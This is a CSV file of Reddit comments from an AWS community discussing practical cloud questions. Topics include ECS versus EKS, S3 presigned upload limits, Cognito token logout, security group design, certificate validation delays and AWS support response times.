g7uq052,j5uch5,"Awesome post, man! I have no experience with CDK but the post is very detailed, I appreciate the fact that cost was part of your analysis as well as complexity and control.",3.0
g7vcbe4,j5uch5,Looks good. I had been meaning to check out exactly how to setup a fargate task. I only skimmed to see the configuration but one thing I’ve experienced with cloud trail s3 upload events -&gt; batch jobs is that the trail event can come through before the upload is finished whereas I’ve heard lambda events do not. Might not be true but I’ve experienced it on the batch side at least.,3.0
g7vx4ys,j5uch5,Really? Generally cloudtrail events are delayed,1.0
g7vzk0t,j5uch5,"I could see this happening with multipart uploads, where the Cloudtrail event for the initial Put API call would probably show up before the last chunk is sent, when it's a big file.",2.0
g7wb232,j5uch5,Yeah we had to institute headObject with retries before doing the get.,1.0
g7wgpob,j5uch5,"What S3 event are you listening for? As I understand it, PutObject will fire for each part but CompleteMultipartUpload should only fire once, at the end.",1.0
g7y42do,j5uch5,I’ll check up on that and get back to you. It’s on a work account.,1.0
g7vo5jz,j5uch5,"Nice article, thanks for taking the time to write it!",1.0
g81nyis,j5uch5,"u/jonberke Very nice article ! Another topic which could be of interest - a SPA ( single page application), using Lambda/API GW to populate data from  Dynamodb tables and compare with ECS/Fargate implementation. 

THANKS !",1.0
g848vgf,j5uch5,I like that idea!  This could also be accomplished with API Gateway talking directly to DynamoDB or by using Amplify as an alternative to CDK.  All those possibilities make for a potentially interesting comparison.,1.0
g7vutzt,j5twnl,"Have you got any experience with CloudFormation? That’s what we use and it works very well. People also seem to like Terraform, which is probably equally good - just a different flavour of the same idea",2.0
g7wprsm,j5twnl,"Yep, you want to codify this.  

Something like a versioned module in TF would do this. 

Alternatively you can bring in an extra layer of orchestration via code deploy.

https://docs.aws.amazon.com/codedeploy/latest/userguide/deployment-groups.html",1.0
g7ucxg1,j5q6fm,"All depends on how big the company is, you could get into security, devops, networking.",2.0
g7ukmgo,j5q6fm,Do the SE roles focus on one thing or are they broad in scope?,1.0
g7ufrmb,j5q6fm,"Solutions Architect and Support Engineer are a world apart.

An SA has a broad understanding of the tech stack and much of AWS's services, and helps customers use them.

A Support Engineer is going to work with internal teams to more or less help them keep things running and automate tasks. You'd be writing scripts and using internal tools to keep the services running and growing.

It seems unlikely that'd a person would be a good fit for both. Generally folks fall in the Support/Systems Engineer (of systems development engineer) family, or more in the solutions architect/(technical) program manager family. Technical Analyst would fall in the latter, I guess.",2.0
g7vi3ky,j5q6fm,"You're right about the SA, but a Support Engineer primarily works with customers when things are broken. EC2 instance keeps stopping? S3 bucket permission problems? That's when you call Support, and a Support Engineer helps you resolve the problem.

What you talked about - working with internal teams to keep things running and automate stuff - is what Amazon refers to as a SysDE, a Systems Development Engineer.",3.0
g7uh1p2,j5q6fm,"Thanks for this, much appreciated.  Do you happen to know if AWS offers any sort of training resources at first or are you thrown into the fires?  By your description I would probably go for the SE role.  Do you happen to know if there is room to move from SE to SA or do they usually not do that?",1.0
g7vi7mr,j5q6fm,"All technical roles at AWS come with a comprehensive onboarding plan these days, and that includes any training you may need. We generally do expect you to have some knowledge of AWS services, but that's not a hard rule.

There's definitely the ability to move from Support Engineer to SA, yes.",3.0
g7uj9hf,j5q6fm,"Since I was hired post-Covid, I haven’t had the chance to run into people outside of my team. So I am talking far out of my depth. I am a consultant in Professional Services. 

That being said, I would think that it might be possible to go from Support Engineer to Technical Account Manager where you support two or three enterprise accounts from a technical support/troubleshooting  perspective for AWS customers to SA. 

My experience is that while some people come into AWS with no previous AWS experience but with relevant industry experience, as time moves on and as more people get outside experience on AWS it will get harder to come in with no AWS experience. 

That being said, there is internal training to ramp you up to your role.

You might have better luck asking questions at r/itcareerquestions",2.0
g7umxfi,j5q6fm,"I think you're expected to have the basics ahead of time, but they can help you fill in the details on working on the company-specific stuff. I'm sure that's all in the job listings, though. You may not need all the requirements listed, but you should have most of them.",1.0
g7v51qb,j5q6fm,"AWS training; go start watching youtube videos.  There's a massive amount of useful content there including official videos from reInvent each year.  AWS definitely offers some training on the solutions architect side because I know a number of folks who were completely anti-cloud and pro on-premise with little to no cloud knowledge who started at AWS and were trained there.  However, all of them were at least semi-competent in datacenter design and architecture before-hand.  


Support engineer is more or less a devops or sysadmin type role.  What I've heard is that technical account manager is a more natural evolution of a SE.  Or... they end up a software engineer for one of the many teams in AWS.  I've met with a a number of internal dev teams since my company is a sizeable customer.  A couple of different engineers I've met came up that route.",1.0
g7vkt7e,j5q6fm,"AWS is very good at giving new hires time to ramp up. Solutions Architects for example typically have a 2-3month ramp up period where you’ll do training, learn the messaging/services, shadow others etc rather than being thrown in the deep end. I’m sure support engineer is the same. As the reply above says, the earlier description of support engineer is wrong. AWS support engineers answer tickets and help solve customer cases. That may involve escalating to service teams at times. Support engineers typically work on a group of AWS services. 

SAs are either generalist but there are also specialist SA roles for things like Security, Containers, ML, Dev Tools etc. Specialists float around helping various customers where the generalist SAs are aligned to an industry or geo.",1.0
g7x2rqx,j5q6fm,"Ah, yeah. There are two families of jobs there. There's the customer support side, where you're working with customers on ""why doesn't this with the way I expect"" type issues (I'm sure they do more, but others will know more than me). And then there's the systems engineering type, which is what I originally described. I think the titles are a little different, like ""cloud support engineer"" vs ""systems support engineer"". But there are definitely people with the title ""support engineer"" that are team focused.

It's a huge company, so there's more than a little diversity between different teams and sub-organizations.",1.0
g7v2v8j,j5tqxj,https://docs.aws.amazon.com/appstream2/latest/developerguide/use-session-scripts.html,1.0
g7w0s6z,j5tqxj,"At the end of the day, Appstream is just windows and FSx is just Windows File shares. So you can setup things the way you would in a normal domain environment. Assuming that both are on the same domain (or FSx trusts the identity domain), you can just use group policy and be done with it.",1.0
g7ua1fx,j5sd8b,"I've seen it take anywhere from a few minutes to 36+ hours.  Commonly it seems to be around 20 minutes for a freshly provisioned cert but there's a lot of variability.  We manage many thousands of certs and had one fail to auto-renew for most of a weekend.  The DNS validation record had been there for 2 years or more from when we originally provisioned it.  I could query the record via dig/nslookup no problem from anywhere but for some reason it failed to validate a few times.  Then when we went to go open a case, it had magically finally validated.",3.0
g7u3o6z,j5sd8b,"I have nothing but personal observations to go on here. That said, it seems as if they use some sort of exponential backoff method - immediately after the certificate request, they check very frequently - maybe once ever 10 seconds or something. If the check continues to fail, they slow down the request rate. Eventually they back off to something like 1/hour.

I've never had a DNS certificate validation take longer than a couple of hours after record creation.

Have you manually verified that the record is in place correctly?",1.0
g7u9xsf,j5sd8b,"I think they check every hour. That's about how long it took for me to get an email saying the renewal had happened.

This is for a certificate that already exists. I don't know why, but I didn't have the validation entry in a cname. I THINK I removed it after I created them the first time, because I didn't understand that aws would rely on them for certificate renewal.",1.0
g7t4m7u,j5npd6,"Hey guys,

A few months back, I made a tutorial about how to host a Laravel app on AWS Elastic Beanstsalk. I received a lot of questions and so I updated the video to include pretty much everything you would need to get a Laravel app up and running on EB, including CI/CD with CodeCommit and CodePipeline, SSH key generation and IAM connection, DB connection, migrations, and daily backups, logs saved to CloudWatch, email setup, domain registration from a third party, SSL certificate creation and forced HTTPS. I initially had some trouble doing some of these things and saw that there wasn't that much material out there to help. So, I hope this helps someone out there! Of course, if you have any tips or tricks on how to improve the video, or would like to see other content, let me know :) 

Thanks!",1.0
g7tkzgm,j5po5n,"The are a few ways you could do this, but all work on the same general principle: recursively get a list of objects in a bucket under a given prefix (if any), and then add up the file sizes of each object.

In other words, what you’d want to do is get list of objects under any given prefix (if any) and add up the file sizes until S3 alerts you that there is no further objects to list.

If you’re using the Command Line Interface, the command:

`aws s3 ls --summarize --human-readable --recursive s3://bucket-name/&lt;prefix&gt;`

should work fine for your needs. Adapt `&lt;prefix&gt;` to be what ever you need it to be; in this case, likely to be `data-type/version-ma/version-mi/account-{id}`.

Thus, the full command would be:

`aws s3 ls --summarize --human-readable --recursive s3://bucket-name/data-type/version-ma/version-mi/account-{id}`

Of course, if you need to do this programmatically, you would need to build a solution based around any of the AWS SDKs.

Happy...uhh...prefixing? Sure, prefixing.",1.0
g7u7c9t,j5po5n,Thanks 👍,1.0
g7tm62z,j5po5n,Not my tool but maybe this might help: [https://github.com/EverythingMe/ncdu-s3](https://github.com/EverythingMe/ncdu-s3),1.0
g7u7dhm,j5po5n,That's a cool tool!!,1.0
g7tr8s9,j5po5n,you can do that with the AWS cli: `aws s3 ls --summarize --human-readable --recursive s3://...`,1.0
g7u7f2t,j5po5n,Thanks!,1.0
g7t1258,j5mqx0,"The Cognito Hosted UI only offers sign-up and sign-in (AFAIK). Once you've got a JWT token, it's up to your app to implement a way to logout or expire/blacklist those tokens.",2.0
g7t1fgj,j5mqx0,"The UI isnt required, but the actually calls to get a token, or signout are important to the usecase",1.0
g7u4tcw,j5mqx0,"Having a ""token revocation list"" kinda defeats the point of stateless auth. Just keep your expiry times low and clean up tokens in the client when you are done with them.",1.0
g7u4xoh,j5mqx0,"So what happens if john doe keeps his tokens (copies and pastes) and tries to use them again after cleanup? Although unlikely, but can happen..",1.0
g7uwijz,j5mqx0,"If the JWT is only valid for 5 minutes its less of an issue. 

We're usually concerned with cases where credentials are leaked to a malicious third party. If you don't trust your users just make sure your authorization scheme is airtight. Don't put yourself in a position where you cannot trust users with their own authentication credentials...",1.0
g7uwwhu,j5mqx0,Any recommendations using sessions instead of jwt?,1.0
g7w2n2o,j5mqx0,"Well sessions are stateful by their nature. Yes you can invalidate the session on the server but that still doesn't really pass the sniff test as users could just go through the same authentication flow they had gone through. I would suggest you stick with the stateless authentication approach especially if you are tying in multiple services. This even if portions of your authorization scheme are stateful. It's much more secure and easier to manage.

Suppose you have a situation where you only wish to allow a user to access a resource (say an s3 bucket) based of some logic. This is a **not** a use case for special *authentication* logic (don't swap JWT claims). This is an *authorization* issue. Proxy the s3 bucket and add authorization middleware that enforces your authorization logic.",1.0
g7v8qg8,j5mqx0,"If logging out users programmatically is important to you, serverside sessions is the way to go. In that case I would use the JWT as a one time credentials to login and create that session. Keep a list of used JWT hashes until they expire.",1.0
g7svay9,j5luk7,"CloudEndure replicates the disk(s) on the source machine at the block level, so whatever you have installed and configured is replicated over as-is.

Should be a non-issue. 

Could also probably use VM Import/Export if it's a VM. https://docs.aws.amazon.com/vm-import/latest/userguide/vmie_prereqs.html#vmimport-operating-systems",3.0
g7tdptc,j5luk7,"Should be working, but please remember that CloudEndure is supporting Windows 10 migration only to dedicated instances or/and hosts on AWS, which are quite expensive :-(",1.0
g7u9th4,j5luk7,"But keep in mind that doing it otherwise is against MS ToS. Actually even going to a dedicated host is sketchy as MS does not allow running desktop OS in the cloud, doesn't it?",1.0
g7v33j6,j5luk7,"of course they allow this, otherwise thousands of customers would not use windows 10 on workspaces. it just requires a BYOL license (and a minimum of 200 workspaces)",1.0
g7vnv5q,j5luk7,"No, Workspaces is a different thing! They say they even have windows 10 stickers on those hosts running Workspaces. We're talking about EC2 here.",1.0
g7yt26i,j5luk7,"it was just an example to explain how licensing works. the point is, you can definitely run windows 10 on AWS. it's just hard",0.0
g7w1koz,j5luk7,Thx. I know.,1.0
g7tf7ku,j5luk7,"CE will take an age. It will do what you want, but honestly the time taken will be a problem.",1.0
g7t5ceo,j5lhhn,"In your service that's generating pre-signed URLs, use the Content-Length header as part of the V4 signature (and accept object size as a parameter from the app). In the client, specify the Content-Length when uploading to S3.  

Your service can then refuse to provide a pre-signed URL for any object larger than some configured size.",17.0
g7tg0gv,j5lhhn,"In my case the service first generates the pre signed URL and provides it to the client (mobile app). Later when the user uploads the file through app, only then the size of file is known. The approach you are suggesting won't work for this scenario.",-1.0
g7tki5m,j5lhhn,Can you call the service to get the URL later when the content length is known? I'm not seeing a maximum size IAM condition key so it seems the only way is when you generate the URL.,7.0
g7wi71o,j5lhhn,I don't have the option of doing that.,1.0
g7t7av2,j5lhhn,"I blogged about this topic recently. I think it may help you out: https://link.medium.com/mnsU65Kflab

There are code samples too: https://github.com/zaccharles/presigned-s3-upload

Most, possibly all, languages can do a HTTP post with a file, so you shouldn't think about the pre-signed POST approach as being browser-only.",3.0
g7sp41r,j5laql,"You can use CloudFront + S3.

If you need authentication too, you can use Lambda@Edge to do that (it runs in front of CloudFront). I just did that for a project - very cool but very fiddly to setup and debug, even with AWS [demo app](https://aws.amazon.com/blogs/networking-and-content-delivery/authorizationedge-using-cookies-protect-your-amazon-cloudfront-content-from-being-downloaded-by-unauthenticated-users/).",3.0
g7sp8g0,j5laql,"For this to work within my api gateway -&gt; lambda architecture for all my endpoints, would I need to make my lambda respond with a redirect?",1.0
g7t0aj4,j5laql,"Yes, the ""Lambda@Edge -&gt; CloudFrount -&gt; S3"" needs it's own URL (typically a sub-domain) and your API Gateway+Lambda would have to redirect over to that. Lambda@Edge can sit in front of CloudFront and be directly invoked by HTTP requests without needing to proxy through an API Gateway.",3.0
g7t16eh,j5laql,Thank you,1.0
g7t4n6h,j5ktbt,i have 1 instance of aurora and read that same the same way you did.  Currently we don't have any application that would spam more than 200 connections per second.  Our soltuion if we hit that cap would be to use aws rds proxy.,1.0
g842lw2,j5ktbt,I have the same doubt. Will the number of max connections be affected even if you're only doing normal password based connections?,1.0
g7smuch,j5jxvg,"Have you looked at [Amazon Inspector?](https://aws.amazon.com/inspector/)

From the [blog post](https://aws.amazon.com/blogs/security/amazon-inspector-assess-network-exposure-ec2-instances-aws-network-reachability-assessments/):

&gt; In other words, it informs you of potential external access to your hosts. It does this by analyzing all of your network configurations—like security groups, network access control lists (ACLs), route tables, and internet gateways (IGWs)—together to infer reachability. No packets need to be sent across the VPC network, nor must attempts be made to connect to EC2 instance network ports—it’s like packet-less network mapping and reconnaissance!",4.0
g7sv5vj,j5jxvg,Thanks for the tip - I had come across it and thought it only gave exposure from the internet rather than both external and internal.,1.0
g7sl38h,j5jxvg,"Here are a couple worth checking out:

https://github.com/duo-labs/cloudmapper

https://github.com/lyft/cartography

And more generally, a great collection of tools related to AWS security: https://github.com/toniblyx/my-arsenal-of-aws-security-tools",2.0
g7sjld3,j5jxvg,You can write a Python script using boto3 to do this. I have scripts to list security groups for each instance. Wouldn’t be difficult to add routing tables to this. a quick Google search should provide you a starting point. Sounds like you are looking for something ready to go instead of putting in the work.,1.0
g7suzwh,j5jxvg,I was trying to ensure I wasn't recreating the wheel. I've seem some that appear to be close but from my searches so far I didnt find anything that considered the routing table aspect.,1.0
g7tcjwy,j5jxvg,"I doubt any of them will be very successful. You'd need to return results for each security group and each subnet an instance can connect to. And if any of those nets/groups have an Ip address with a service configured to do routing proxying or NAT, then whatever they can connect to needs adding. (And the same for from.)

Eg I can create an ALB with internet access allowed on port 80. And an instance on a private subnet allowing access from the ALB's security group on port 8080.

If I look at just the groups, then my instance cannot be accessed from the internet. It is doubly protected by a security group and a subnet without inbound internet access. In reality, people can access it (indirectly) on port 8080 via the ALB.

Purists will say ""that's the ALB having access not the people on the internet"" but if you told management there was no way anyone on the internet could access anything on the instance, you're probably fired about now.

You could just list the subnets/groups you can connect to/from, but that is simply a case of querying the groups, no magic there. ""You can connect to 10.1.2.0/8 and sg-123456 if you have a route to them"". I think you're asking what is in those nets/groups.",1.0
g7t35ji,j5k9hy,"You can backup an in-use EC2 Volume without affecting the data being read/write from that volume.

However, there is no guarantee you'll get a backup you can do an atomic restore with. For example, if you're storing a live relational database server's database files on the volume, if data is written during the backup process, you can have a backup that contains a half-written transaction and can't be restored back into a database.",1.0
g7vnt9u,j5k9hy,Thanks it’s like I thought,1.0
g7sg4iz,j5jsap,Why the UI changes if backlash (of at least the reddit community) seems to be immense?,5.0
g7sl2k1,j5jsap,"I'm pissed they remove features. I can't sort the list of services alphabetically any more? Great, time to learn their odd classification of service groups.",3.0
g7spr10,j5jsap,I don’t bother with that just because every time I sign in it gets longer. I prefer to just type a few letters into the search box.,1.0
g7sq2ec,j5jsap,"It's only the times I'm lazily clicking around with the mouse but it still broke my workflow.

Obligatory https://xkcd.com/1172/.",3.0
g7ssepf,j5jsap,"I signed up for and started using an AWS EC2 instance a month or two back, and at the start of this month got a bill for $0.01 lol. I thought running a single EC2 instance 24/7 full month would be free (750 hours every month allowed for free for a full year thing), so this invoice is surprising.",1.0
g7ugiue,j5jsap,"While EC2 usage is free, things like the associated EBS storage or snapshots also have limits on their free tiers. You should review the bill breakdown to see which part is specifically costing you.",3.0
g7v3rm0,j5jsap,"You're right, will do that once again as couldn't find anything on the first look over. Mostly I won't even be making the payment as it is just 1 cent but I'm wondering if they'll start charging penal interest on it after a while.",1.0
g7v9x2p,j5jsap,I don't believe so. If you just message them they'll probably remove the charge from your account entirely.,2.0
g7szgvv,j5jsap,"Is the general feedback for new UI positive or negative?

I am trying to find out if I live in an echo chamber or not.",1.0
g7tpb8b,j5jsap,Are There anyone offer like https://appsumo.com/startups/ that still give AWS credit?,1.0
g7v15ja,j5jsap,"Why doesn't boto3 have an implementation for getting an arbitrary number of items from dynamodb in a single call (i.e. you pass all the keys as an array, and it returns an array with the results)? I know how to implement this with multiple calls to batch_get_items(), but why didn't they include a simple function that in the most straightforward way does this for you? Is it an oversight, is it meant to discourage such use, etc.?",1.0
g7vmjz6,j5jsap,"Is there a way to check or view the summary of all appsI am using under my account instead of going to individual services/dashboards? Like if I need to know how many EC2 I have, I need to go to EC2, then S3, then Lambda. Anyway to check summary view?",1.0
g7wc8h5,j5jsap,Does anybody have any reference material on how I can pull Kubernetes environment variable values from Param Store?,1.0
g7x5aqe,j5jsap,"Background: Starting to deploy in AWS after being non-cloud (aka deployment on VM's in datacenters) for a while. It is a Windows shop but not a large organization (think bunch of laptops). On switching it looks like we have to utilize EC2 instances, database, and S3 for files. I am confident with general administration concepts , basic networking, app development and scripting (mainly admin stuff). While there is lots of good documentation on AWS I am in a bit of crunch. What is a helpful book that I can get for best practices? I want to focus on doing IAM, security groups, and one or two more fundamental concepts correctly. Relying on feedback on what those one or two more topics should be.  
  
In addition, I would like to flush out a secure external access mechanism (laptop to EC2 instance via RDP). Currently, the datacenter provides a VPN+MFA which we used to login and access our servers; we did not manage the VPN itself. What approach is available for accessing EC2 instances - it does not have to be an AWS solution. The primary goal is to have it managed for us. Open to solutions that involve WireGuard etc (looked at Tailscale but it is not an IdP so we would have to get that integrated). In fact, I am slightly biased to external solutions that can be easily integrated into AWS and other environments. We do not have any legacy AD to transfer - it can be a clean sheet setup.",1.0
g82p35l,j5jsap,Why isn’t there a boto implementation in node.js?,1.0
g7si3q4,j5jsap,why would anyone pay for support when it takes days for a generic response?,-1.0
g7soo5c,j5jsap,FWIW my company has an enterprise support plan and we've rarely had to wait more than 2-4 hours for a response.,4.0
g7spnb2,j5jsap,It’s usually even faster if you use phone support.,1.0
g7sq1sp,j5jsap,"Am I the only one who still finds that un reasonable? 
Sure you get a response, but that might not include a resolution. Do you then wait another 2-4hrs for another response? 
2hrs is a long time when your system is crippled, let alone a entire workday to exchange 2 messages.",-2.0
g7sqc6x,j5jsap,"They offer less than 1 hour for ""production system down"" and if you're on Enterprise then under 15 minutes for ""Business-critical system down"". That seems reasonable to me especially when in practice I've always got a phone call within minutes.",3.0
g7sslia,j5jsap,Yes. 15mins is reasonable.,2.0
g7swxpq,j5jsap,I've gotten response via email within a few hours with standard support.,1.0
g7szpxx,j5jsap,"damn. lucky. 
- Developer support. 
- Critical failure 

1st message after about 24hrs which was just telling me to paste log files, second message +12hrs saying try these easily googled solutions.  I dont see the value atm.",0.0
g7u6y8v,j5jsap,Bring this up with your TAM,1.0
g7vdlox,j5jsap,Dev level support doesn't get a TAM.,2.0
g7vx1q3,j5jsap,Good point,1.0
g7sgoyl,j5jm8h,"You can use the output of the WorkSpaces Cost Optimizer for this purpose if you'd like. The solution gets the data from either UserConnected or Running (depending on whether it is an Always On WorkSpace or an Auto Stop WorkSpace, respectively).

I would suggest taking a look at a couple month's worth of files, to make sure it wasn't an isolated event that the end user didn't happen to use their WorkSpace that month. If the users aren't part of your organization, it is likely safe to delete their WorkSpace, assuming you don't need to keep the data on it for any reason. I often recommend you email the end users about their pending loss of their WorkSpace, or work the termination into your lifecycle process for users.",3.0
g7xt1fw,j5jm8h,"Yes, the optimizer file will get us there. It's a few steps more than ideal... would be nice to just get a json output of all units with &lt;10 hours of run time or something without having to read a csv and compile it. We haven't found this magical thing, so we'll add to our bus layer. When asked by ServiceNow it will spit out a nice JSON of workspaceIDs to deal with, SN will then start the deprovision process and email the user. Our automation can get a WS provisioned in minutes after approval so they can just submit another request if we screwed them :-) also, we warned users 100000000 times, don't save important stuff on the workspace!",1.0
g7y020z,j5jm8h,"Check out the UserConnected CloudWatch metric. You should be able to check the WorkSpaces and generate an alarm (as one example) on them if their usage goes below 10 hours in 90 days (or whatever combination works for you). The alarm could then trigger a series of events that leads to their termination. I usually suggest making that a semi-manual process, just to make sure you don't accidentally delete anybody's WorkSpaces due to a mistyped command.",2.0
g7skh8i,j5jm8h,"I didn't know this existed, I've put it into my backlog.  Thanks!",3.0
g7sk8jm,j5ii8m,"May be this project (looks new...) could help: [https://github.com/jcjorel/clonesquad/](https://github.com/jcjorel/clonesquad/) 

It looks maching your need. (I have not tested it).",1.0
g7vgzus,j5ii8m,Thanks. Will have a look at it.,1.0
g7szlik,j5ii8m,"You can have a consistent number of instances running for peak and bring some of them down (stop) during non-peak and start them up during peak. You can use Lambda and EC2 Instance scheduler to achieve this. 

If you are looking for a commercial solution,[INVOKE Cloud](http://invoke.cloud) could help. NOTE: I am co-founder.",1.0
g7vh11b,j5ii8m,Thanks for the options. Will also have a look at them.,1.0
g7s8lwv,j5ifbr,"What you're trying to do should work ok.

I'm going to guess it's got something to do with how you're referencing the path. It's a bit hard to troubleshoot without seeing the code and files, though what you could do is look at the packaged lambda either via the console or perhaps explode the zip that sls creates before it gets uploads.

What might help is using `__dirname` and `path.join` to construct the correct path regardless of where it's executing.

You could also add some debug code do dump a recursive `ls` starting from what you're expecting the the 'project root' to be.

I wouldn't use s3 to host the static files in this context.",2.0
g7s9w0m,j5ifbr,"I was doing `path.resolve(process.cwd(), 'api/shared/templates/pdf.html')`

Locally that worked because `process.cwd()` was the absolute path from drive root (C: on windows) to the project directory, then I just appended the path to the templates.

`__dirname` was only returning a single `/` .  It's possible something is misconfigured and throwing it off.",1.0
g7sgddg,j5ikem,"I haven’t actually used Elastic Beanstalk. But, CodePipeline let’s you add a deployment step with ElasticBeanstalk as the deployment type. 

The easiest way to set that up is by using CodeStar. It will generate the CF template that creates a basic CodePipeline. You can take that template and modify it as you need.

I am not necessarily suggesting you use the created CodeStar environment. Just the templates.",1.0
g7sm9u1,j5ikem,I just finished an Elastic Beanstalk project using Terraform + Bitbucket Pipeline. Works greatly!,1.0
g7vro7d,j5ikem,Thanks... I’ll be looking in to this today.,1.0
g7rtsfr,j5cg3h,ECS Fargate might be going for you. It uses docker images.,7.0
g7sitiu,j5cg3h,If you can run that process on the background you can use SQS + step functions,2.0
g7s003m,j5cg3h,Lambda has a 15 minute duration limit. If you need to go longer than that there are maybe some other options. Does the web socket need to be left open indefinitely?,1.0
g7slpl5,j5cg3h,"yes, as long as possible as it is a part of my data collection project",1.0
g7vlj1g,j5cg3h,"You can look into utilizing the pattern described in ""Implementing a long-running query on AWS AppSync"" - https://aws.amazon.com/blogs/mobile/invoke-aws-services-directly-from-aws-appsync/ . Probably not the best fit since you didn't mention AppSync service, but it allows you to get data async using WebSockets.",1.0
g7rrx6z,j5ghkc,"Least permissive is right. Managing access with from/to security groups is the way to go. So as you said only your Bastion host SG is allowed SSH access, etc",4.0
g7s97zi,j5ghkc,"Referencing security groups is best as it decouples it from the networking layer. E.g. you could expand a subnet, decide you want to move to a HA deployment with multiple subnets, etc.. and not have to worry about updating your security groups.",4.0
g7sd6k2,j5ghkc,"You should design and implement SGs using Principle of least privilege. What it means that your setup must allow only the connectivity that is actually needed, there should be no permissions that are not used. For example: ""meaning anything in the VPC's private subnets can access the rabbitmq ports on the rabbitmq ASG's instances."" goes against this principle, because anything doesn't need access to rabbitmq. You should only allow connections to rabbitmq's SG from SGs with instances that need to be able to make this connection.",2.0
g7tc79s,j5ghkc,"Not advice on SGs, but just wanted to suggest that you use session manager to avoid having to open up port 22 to the outside world. Check it out. All shell access via the Web console, using IAM auth and fully logged.",2.0
g7rt46b,j5g80w,Sounds like the input being passed to the transformer rule is invalid? You check for special characters from a bad copy/paste or single quotes vs double? Not sure where your input if coming from in this case.,2.0
g7v5u2u,j5g80w,"thanks, I copied the event structure straight from tutorial page so unless they have got it wrong, chances of me doing something wrong are low.",1.0
g7s0ue2,j5g80w,Should be &lt;instance-id&gt;,0.0
g7v5r8x,j5g80w,"thanks, the tutorial doesn't say that but I'll try witj &lt;instance-id&gt;",1.0
g7vjj17,j5g80w,I think the value in the top box needs to be the same as the bottom box. You have different ones,1.0
g7rby85,j5daf2,Based on the reasons listed you should absolutely use ECS.,49.0
g7rh1yt,j5daf2,"The only reason for using kubernetes with that kind of load /applications I have seen is that ""it sounds cool"". Eks (or any managed or unmanaged else setup) is massive overkill unless you already know that what you want to achieve can't be done any other way. Probably a controversial opinion but it's based on my personal experience with a team of developers eager to try next next shiny toy and a 6 month project started 2 years ago that still isn't finished",54.0
g7s8uj7,j5daf2,"We’ve just binned off a migration to EKS from docker swarm in favour of ECS with fargate. 

K8s was so needlessly complicated and over the top for our usage. Decided ECS ticked the box and was more “the AWS way”",17.0
g7tfoe8,j5daf2,Absolutely. This matches my experience.,5.0
g7u0qs2,j5daf2,I am currently trying to evaluate ECS vs Beanstalk w/ Containers. Did you all consider Beanstalk and what conclusions did you draw?,2.0
g7vab8n,j5daf2,I don't like Beanstalk because of the .ebextensions to do anything with. It's easy enough and it works but I like the flexibility of doing anything I want at any time with ECS with less of an AWS wrapper.,2.0
g7wrcxi,j5daf2,We were more looking at ECS as the support for docker-compose is in beta. As we are using Swarm at the moment this would massively reduce our migration so beanstalk never really entered the picture.,1.0
g7tok9b,j5daf2,"I've been using both for years. . . when you choose Kubernetes, it's like having a piñata of complex and overlapping technical questions explode in your face.

Yeah, it sounds cool. It's still the ""hotness"". . . but mother of Christ, it's such a technical debt factory.

If you are seriously thinking of going multi-cloud and you really need to know what you're doing before you make such a decision, then it might make sense. Otherwise, if you're on AWS, you should start out with Lambda and/or Fargate and then move to ECS (EC2 based) if and only if Lambda and Fargate hold you back.

Also. . . while I live and breathe AWS every day (and generally enjoy it a lot). . . I would ALSO recommend steering clear of AppSync + Amplify. AWS has been pushing that stack pretty hard lately but it's a recursive rabbit hole just waiting to tear you apart. Yep, your frontend/mobile devs will love the shit out of it, but it will confound and torture everyone else on your team. BEWARE.",7.0
g7vfdsz,j5daf2,"""it's such a technical debt factory"" everything I said summed up in one sentence!",2.0
g7wb1jg,j5daf2,"Ha ha, thanks. I mean, it *is* powerful but jesus christ, it's insanely complicated.

TDaaS",1.0
g7vad9n,j5daf2,has Fargate's prices gone down recently? IIRC we avoided it because of the price.,1.0
g7wa0xt,j5daf2,"Ha ha, good point. . . the prices have come down a bit. It's one of those things where you really need to do the math. Fargate significantly reduces management costs, just like Lambda. If you look at the straight service price, you're not really comparing apples to apples.",1.0
g7vmcty,j5daf2,"I'm interested in your comments about Amplify and AppSync, particularly the rabbit hole bit...  can you expand on the issue?  On the face of it, it looks great, but I'm only thinking like a dev at the moment - functionality rather than having to live with it in prod...",1.0
g7wct19,j5daf2,"It blurs heavily with IaC tools like CloudFormation and Terraform. Also, the whole GraphQL side of things is a bit hand wavy as far as the back end is concerned. It's great for super basic CRUD apps backed by DynamoDB. But if you veer off of that happy path, it becomes difficult to manage. 

I'm not really a fan of GraphQL in general as it obscures the actual HTTP requests behind the scenes. . . however, this is what UI/mobile devs love. It gives them a structured and generally clean query language to use vs the subjective/open ended raw REST approach. 

Also. . . you may be tempted to add Cognito to the mix and that's where you're going to really bang your head against the wall. Cognito could be an Auth0/Okta killer but the doc is horrific. I have no idea why AWS has let this service rot on the vine.",2.0
g7rb4g9,j5daf2,"Unless you need specific functionality that only Kubernetes provides, no.",35.0
g7rzsfb,j5daf2,"Stick with ECS. 

We are an all ECS shop. (ECS + ALB + Route53). This setup is ideal for almost 99% of our use-case.

Ecs is pretty sick imo. Gives me all the features I need. We are not on fargate, so I need to configure the ec2 instances myself, but that is also not a big deal since i get to bake in my images.

&amp;#x200B;

Look at AppMesh. we currently do not need it, but it would be awesome thing to have and completely eliminate the load balancers.",14.0
g7sc4wv,j5daf2,"We provide support to devs for EC2 and Fargate and the only thing I really dislike about Fargate is not being able to provide a JSON Key when adding secrets to the task definition.  
  
Means we have to split the JSON with a script in the container.",4.0
g7u6mwu,j5daf2,This 100x. Only pain point I’ve had using ECS Fargate. Almost as if AWS wants you to pay the secret tax for each key 😏,2.0
g7sdc8x,j5daf2,"AppMesh seems pretty cool, but I haven't had the opportunity to use it yet. I recently learned about [ECS Service Discovery](https://docs.aws.amazon.com/AmazonECS/latest/developerguide/service-discovery.html) and it's been great as a very lightweight way to connect internal services without a load balancer. It's all DNS based, so it doesn't offer any extra insights/metrics, but it's really simple to set up.",2.0
g7rovkl,j5daf2,"The main advantage of k8s in this case is that there are so many more 3rd party tools available compared to ECS.  Things like monitoring, debugging, management, etc.

Also devs can set up a local k8s environment similar to production on their laptops very easily nowadays.",25.0
g7sufc3,j5daf2,"The ECS integration with docker let's you deploy to ECS directly from local. But yes, the ecosystem of K8s has more options these days. But if the existing AWS services serve your  need, ECS is great and simple.",3.0
g7s0co7,j5daf2,"And there are so many tools for AWS and plugins too ...
From PyCharm / IntelliJ you can track cluster, services and tasks, and get the logs all on one place.
3rd party tools also means more depenendencies to track.",1.0
g7ta42f,j5daf2,"k8s ecosystem is exploding for sure - and once you get up to speed on it, it's really not that difficult a concept to get.",0.0
g7rawpd,j5daf2,"Honestly EKS should be used if you already use k8s elsewhere already.

ECS, especially if you are going to use fargate on both, is more then capable",13.0
